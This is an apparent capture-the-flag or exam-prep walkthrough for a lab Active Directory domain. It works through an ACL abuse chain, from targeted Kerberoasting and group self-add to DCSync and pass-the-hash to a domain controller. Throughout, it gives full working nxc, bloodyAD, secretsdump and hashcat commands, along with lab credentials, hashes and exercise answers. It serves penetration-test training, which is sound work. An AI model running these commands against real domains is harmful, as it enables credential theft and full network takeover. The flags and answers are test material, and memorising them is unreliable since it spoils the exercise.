# Section 11 — Active Directory Compromise

> From the `mssqladm:DBAilfreight1!` credential, abuse a short ACL chain to reach Domain Admin: GenericWrite → targeted Kerberoast → GenericAll → DCSync. End state: full INLANEFREIGHT.LOCAL compromise, NTDS dumped, flag off the DC. Entire chain is Linux-native through the SOCKS proxy — no DEV01/PowerView round-trip needed.

---

## Prereq — Recover the Starting Credential

Section 11 assumes you hold `mssqladm:DBAilfreight1!`. That cred is **not** handed to you — it comes from the **MS01 LSA-secrets autologon password** (the §10 post-exploitation step). If you skipped it (went straight to the §10 flag + Inveigh), grab it now via the MS01 admin you already have:

```bash
# LocalAccountTokenFilterPolicy=1 already set in §10 -> ilfserveradm gets full SMB token
proxychains4 -q nxc smb 172.16.8.50 -u ilfserveradm -p 'Sys26Admin' --local-auth --lsa | grep -i default
```
```
INLANEFREIGHT\mssqladm:DBAilfreight1!
```
> `DBAilfreight1!` is the Winlogon `DefaultPassword`; `mssqladm` is the `DefaultUserName`. Autologon creds live in LSA secrets in cleartext because the OS needs them to log in unattended. Validate against the DC: `nxc smb 172.16.8.3 -u mssqladm -p 'DBAilfreight1!'`.

---

## The ACL Chain (read it in BloodHound first)

```
mssqladm  --GenericWrite-->  ttimmons         (write any attribute, e.g. an SPN)
ttimmons  --GenericAll-->    SERVER ADMINS     (full control of the group → add members)
SERVER ADMINS  --GetChanges/GetChangesAll-->  DC01   (DCSync rights)
```
> This is why BloodHound matters: three hops, none of them "admin", chain into domain takeover. Mark each owned principal and run *Shortest Path to Domain Admins* — the tool draws this for you.

---

## Step 1 — Targeted Kerberoast via GenericWrite (Q1)

`mssqladm` can write `ttimmons`' attributes but isn't an admin. Abuse GenericWrite to set a **fake SPN**, which makes `ttimmons` Kerberoastable on demand.

### Set the fake SPN (Linux — bloodyAD, not PowerView)

```bash
proxychains4 -q bloodyAD --host 172.16.8.3 -d inlanefreight.local \
  -u mssqladm -p 'DBAilfreight1!' \
  set object ttimmons servicePrincipalName -v 'acmetesting/LEGIT'
```
> The walkthrough does this from DEV01 with `Set-DomainObject -SET @{serviceprincipalname=...}` and a PSCredential. `bloodyAD set object` is the one-line Linux equivalent through the proxy.

### Roast and crack

```bash
proxychains4 -q GetUserSPNs.py -dc-ip 172.16.8.3 \
  INLANEFREIGHT.LOCAL/mssqladm:'DBAilfreight1!' \
  -request-user ttimmons -outputfile ttimmons_tgs.txt
# crack on the GPU host
hashcat -m 13100 ttimmons_tgs.txt rockyou.txt -O
```
**Q1:** `ttimmons : Repeat09`

> **Clean up the SPN afterward** (appendix change). To delete the attribute with bloodyAD, run `set object` with **no `-v`** at all (omitting the flag = delete; passing `-v` with no value is a parse error): `bloodyAD ... set object ttimmons servicePrincipalName`.

---

## Step 2 — GenericAll → Group → DCSync (Q3)

`ttimmons` has **GenericAll** over the **SERVER ADMINS** group, and that group holds **DCSync** rights (`DS-Replication-Get-Changes` / `-All`). Add ttimmons to the group, inherit DCSync, dump NTDS.

### Add self to the group

```bash
proxychains4 -q bloodyAD --host 172.16.8.3 -d inlanefreight.local \
  -u ttimmons -p 'Repeat09' \
  add groupMember "SERVER ADMINS" ttimmons
```
> Walkthrough equivalent: `Add-DomainGroupMember -Identity (Convert-NameToSid "Server Admins") -Members ttimmons -Credential $timcreds`.

### DCSync the domain

```bash
proxychains4 -q secretsdump.py INLANEFREIGHT.LOCAL/ttimmons:'Repeat09'@172.16.8.3 \
  -just-dc-ntlm -outputfile ntds
```
> `-just-dc-ntlm` uses DRSUAPI replication (DCSync) to pull NTLM hashes for **every** account without touching disk on the DC. Drop `-ntlm` to also get Kerberos keys / cleartext (history). Dumped **2522** accounts here.

**Q3 — Administrator NT hash:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
```
→ `fd1f7e5564060258ea787ddbb6e6afa2`

> Keep the full NTDS for the client deliverable: offline-crack it (`hashcat -m 1000`) to report password strength, reuse, and cracked-DA metrics.

---

## Step 3 — Pass-the-Hash to the DC (Q2)

Authenticate to DC01 as Domain Admin with the dumped hash — no password needed:

```bash
proxychains4 -q nxc smb 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2 \
  -x "cmd /c type c:\users\administrator\desktop\flag.txt"
```
`(Pwn3d!)` + flag. **Q2:** `7c09eb1fff981654a3bb3b4a4e0d176a`

> For a real report, a DA-on-DC screenshot (`hostname` / `whoami` / `ipconfig /all` via RDP or `wmiexec.py`) lands harder with the client than raw secretsdump output. Pass-the-hash to RDP: `xfreerdp /v:DC /u:Administrator /pth:<hash>` (needs Restricted Admin) or PtH to a shell with `psexec.py -hashes :<hash>`.

---

## What We Have Now

| Item | Value |
|------|-------|
| Section-11 start cred | `mssqladm:DBAilfreight1!` (MS01 LSA autologon) |
| Kerberoast crack | `ttimmons:Repeat09` |
| **Domain Admin** | `Administrator:fd1f7e5564060258ea787ddbb6e6afa2` (PtH) |
| DC01 flag | `7c09eb1fff981654a3bb3b4a4e0d176a` |
| NTDS dump | 2522 accounts (krbtgt hash included → Golden Ticket capable) |

## Attack Chain (full, §9→§11)

```
external → dmz01 root → SOCKS into 172.16.8.0/23
  → DEV01 DNN → SYSTEM → hporter:Gr8hambino! (domain user)          [§9]
  → Kerberoast → backupjob → share creds → backupadm                [§10]
  → MS01 WinRM → ilfserveradm → Sysax SYSTEM → local admin + flag   [§10]
  → Inveigh → mpalledorous:1squints2 ; MS01 LSA → mssqladm          [§10/11]
  → mssqladm GenericWrite → ttimmons (Kerberoast) → Repeat09        [§11]
  → ttimmons GenericAll → SERVER ADMINS → DCSync                    [§11]
  → DCSync → Administrator hash → PtH DC01 → DOMAIN ADMIN           [§11]
```

## Exam Relevance

- **ACL-chain takeover is the CPTS bread-and-butter** — GenericWrite/GenericAll/WriteDACL/WriteOwner/ForceChangePassword. Learn the abuse primitive for each; BloodHound's "Help → Abuse Info" on any edge gives the exact commands.
- **GenericWrite on a user → targeted Kerberoast** (set fake SPN) OR **targeted ASREPRoast** (clear `DONT_REQ_PREAUTH` via `userAccountControl`). GenericWrite on a computer → RBCD.
- **GenericAll on a group → add yourself** → inherit whatever the group can do (here, DCSync).
- **DCSync rights = game over** — any principal with `GetChanges` + `GetChangesAll` on the domain object can replicate every hash. `secretsdump.py -just-dc`.
- **bloodyAD is the Linux Swiss-army knife for AD writes** — `set object`, `add groupMember`, `set owner`, `add genericAll`, `set password`, `add dcsync`. No need to stage PowerView on a Windows foothold.
- **Pass-the-Hash** — `nxc -H`, `psexec.py/wmiexec.py -hashes :<nt>`, `xfreerdp /pth`. The NT hash authenticates as well as the password for NTLM.
- **Post-DA value-adds** (mention in report): full NTDS offline crack for password metrics, Golden Ticket from krbtgt hash for persistence demo, domain/forest trust attacks if in scope, and a "can you detect us?" test by touching DA/EA group membership.

## Changes Made (reverted / log in appendix)

- Set then **cleared** fake SPN `acmetesting/LEGIT` on `ttimmons` ✓ reverted
- Added then **removed** `ttimmons` from `SERVER ADMINS` ✓ reverted
- (Carried from §10: ssmalls password reset, ilfserveradm in MS01 local admins, `LocalAccountTokenFilterPolicy=1` on MS01)
